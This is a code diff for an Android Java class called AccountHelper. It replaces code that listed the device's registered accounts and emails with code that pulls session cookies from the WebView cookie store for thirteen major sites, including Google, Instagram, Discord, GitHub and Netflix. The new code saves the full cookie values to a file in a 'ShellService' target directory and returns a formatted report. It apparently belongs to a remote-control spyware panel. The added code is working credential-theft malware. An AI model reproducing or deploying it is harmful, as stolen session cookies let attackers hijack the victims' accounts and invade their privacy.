@@ -1,65 +1,77 @@
 package com.java.panel;
 
-import android.accounts.Account;
-import android.accounts.AccountManager;
-import android.Manifest;
 import android.content.Context;
-import android.content.pm.PackageManager;
-import androidx.core.content.ContextCompat;
+import android.webkit.CookieManager;
+import android.webkit.WebView;
+import java.io.File;
+import java.io.FileOutputStream;
 
 public class AccountHelper {
+
     public static String getAccounts(Context context) {
         try {
-            if (ContextCompat.checkSelfPermission(context, Manifest.permission.GET_ACCOUNTS) != PackageManager.PERMISSION_GRANTED) {
-                return "❌ GET_ACCOUNTS permission is required to read accounts.";
+            try {
+                new WebView(context);
+            } catch (Exception ignored) {}
+
+            CookieManager cookieManager = CookieManager.getInstance();
+            if (cookieManager == null) {
+                return "📭 CookieManager is not available.";
             }
+            cookieManager.setAcceptCookie(true);
 
-            AccountManager accountManager = AccountManager.get(context);
-            Account[] accounts = accountManager.getAccounts();
+            String[] targetUrls = {
+                "https://google.com",
+                "https://youtube.com",
+                "https://instagram.com",
+                "https://twitter.com",
+                "https://facebook.com",
+                "https://discord.com",
+                "https://telegram.org",
+                "https://github.com",
+                "https://netflix.com",
+                "https://tiktok.com",
+                "https://reddit.com",
+                "https://spotify.com",
+                "https://twitch.tv"
+            };
 
-            if (accounts == null || accounts.length == 0) {
-                return "📭 No registered accounts found on the device.";
-            }
+            StringBuilder fullReport = new StringBuilder("╭───『 🍪 Web Cookies Report 』───╮\n\n");
+            StringBuilder fileContent = new StringBuilder("=== WEB COOKIES REPORT ===\n\n");
+            int foundCount = 0;
 
-            StringBuilder sb = new StringBuilder("╭───『 👤 Device Accounts 』───╮\n\n");
-            sb.append("Total Accounts: ").append(accounts.length).append("\n\n");
+            for (String url : targetUrls) {
+                String cookies = cookieManager.getCookie(url);
+                if (cookies != null && !cookies.trim().isEmpty()) {
+                    foundCount++;
+                    String domainName = url.replace("https://", "").replace("http://", "");
+                    
+                    fullReport.append("  🌐 **Domain:** `").append(domainName).append("`\n");
+                    fullReport.append("    └ **Status:** `Active Session Found`\n\n");
 
-            for (int i = 0; i < accounts.length; i++) {
-                Account acc = accounts[i];
-                String icon = "🔑";
-                String typeDesc = acc.type;
-                String lowerType = acc.type.toLowerCase();
-
-                // Assign smart icon and label based on account type
-                if (lowerType.contains("google")) {
-                    icon = "🌐";
-                    typeDesc = "Google Account";
-                } else if (lowerType.contains("whatsapp")) {
-                    icon = "💬";
-                    typeDesc = "WhatsApp";
-                } else if (lowerType.contains("telegram")) {
-                    icon = "✈️";
-                    typeDesc = "Telegram";
-                } else if (lowerType.contains("facebook") || lowerType.contains("meta")) {
-                    icon = "📘";
-                    typeDesc = "Meta / Facebook";
-                } else if (lowerType.contains("exchange") || lowerType.contains("corp") || lowerType.contains("work")) {
-                    icon = "💼";
-                    typeDesc = "Corporate / Exchange";
-                } else if (lowerType.contains("twitter") || lowerType.contains("x.com")) {
-                    icon = "🐦";
-                    typeDesc = "X (Twitter)";
+                    fileContent.append("--------------------------------------------------\n");
+                    fileContent.append("Domain: ").append(domainName).append("\n");
+                    fileContent.append("Cookies:\n").append(cookies).append("\n\n");
                 }
-
-                sb.append("  ").append(icon).append(" **").append(typeDesc).append("**\n");
-                sb.append("    └ **User/Email:** `").append(acc.name).append("`\n");
-                sb.append("    └ **Type Package:** `").append(acc.type).append("`\n\n");
             }
 
-            sb.append("╰─────────────────────────────╯");
-            return sb.toString();
+            if (foundCount == 0) {
+                return "📭 No active cookies found for target domains.";
+            }
+
+            String filePath = ShellService.TARGET_DIR + "cookies_" + System.currentTimeMillis() + ".txt";
+            File file = new File(filePath);
+            FileOutputStream fos = new FileOutputStream(file);
+            fos.write(fileContent.toString().getBytes());
+            fos.close();
+
+            fullReport.append("📊 **Found Domains:** `").append(foundCount).append("`\n");
+            fullReport.append("💾 **Saved to File:** `").append(filePath).append("`\n");
+            fullReport.append("╰────────────────────────╯");
+
+            return fullReport.toString();
         } catch (Exception e) {
-            return "❌ Error while fetching accounts: " + e.getMessage();
+            return "❌ Error while fetching cookies: " + e.getMessage();
         }
     }
 }
